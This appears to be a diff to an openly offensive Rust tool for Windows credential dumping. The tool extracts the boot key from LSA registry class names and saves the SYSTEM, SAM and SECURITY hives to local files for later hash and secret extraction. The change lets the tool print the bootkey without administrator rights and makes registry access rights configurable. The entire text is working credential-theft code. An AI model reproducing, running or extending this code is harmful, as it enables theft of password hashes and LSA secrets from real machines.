@@ -52,12 +52,7 @@ const SE_BACKUP_NAME: [u16 ; 18] = [83, 101, 66, 97, 99, 107, 117, 112, 80, 114,
 // main
 
 fn main() {
-
-    if !is_elevated() {
-        println!("Run me as Administrator!");
-        return;
-    }
-
+    
     let current_location = current_dir().unwrap().display().to_string();
 
     //needed to save keys, even as SYSTEM
@@ -75,27 +70,34 @@ fn main() {
     if !boolean {
         println!("{_result}");
     }    
-
+    //
+    
     let scrambled_key = collect_classnames();
     let key = encode(get_bootkey(scrambled_key));
     
-    println!("Bootkey: {}", key);
+    println!("Bootkey: {}\n", key);
 
-    // dump SYSTEM
-    let handle = open_regkey("SYSTEM".to_string());
-    let dest_file = format!("{current_location}\\sistemino.txt");
-    save_regkey(handle, dest_file);
-    
-    // dump SAM
-    let handle = open_regkey("SAM".to_string());
-    let dest_file = format!("{current_location}\\samantha.txt");
-    save_regkey(handle, dest_file);
-    
-    if is_system() {
-        // dump SECURITY, need SYSTEM privs
-        let handle = open_regkey("SECURITY".to_string());
-        let dest_file = format!("{current_location}\\secco.txt");
+    if is_elevated() {
+
+        let reg_access_right = 0xF003Fu32; //full access
+
+        // dump SYSTEM
+        let handle = open_regkey("SYSTEM".to_string(), reg_access_right);
+        let dest_file = format!("{current_location}\\sistemino.txt");
         save_regkey(handle, dest_file);
+        
+        // dump SAM
+        let handle = open_regkey("SAM".to_string(), reg_access_right);
+        let dest_file = format!("{current_location}\\samantha.txt");
+        save_regkey(handle, dest_file);
+        
+        if is_system() {
+            // dump SECURITY, need SYSTEM privs
+            let handle = open_regkey("SECURITY".to_string(), reg_access_right);
+            let dest_file = format!("{current_location}\\secco.txt");
+            save_regkey(handle, dest_file);
+        }
+
     }
 
 }
@@ -170,7 +172,7 @@ fn collect_classnames() -> String {
     let mut result = String::new();
 
     for key in keys {
-        let hkey = open_regkey(key.to_string());
+        let hkey = open_regkey(key.to_string(), 0x19u32); //acc right 0x19 => REG_QUERY_VALUE
         result.push_str(read_classname(hkey).as_str());
     }
 
@@ -214,7 +216,7 @@ fn enable_debug_privilege(ptr_privilege: *const u16) -> (bool, String) {
 }
 
 
-fn open_regkey(subkey: String) -> HKEY {
+fn open_regkey(subkey: String, access_right: u32) -> HKEY {
     unsafe {
         let mut hkey: HKEY = std::mem::zeroed();
         let location = format!("{}", subkey);
@@ -224,7 +226,7 @@ fn open_regkey(subkey: String) -> HKEY {
             0x80000002 as HKEY, //HKLM
             cstring.as_ptr(),
             0x0,
-            0xF003F, //0x19 ??
+            access_right,
             &mut hkey,
         );
         
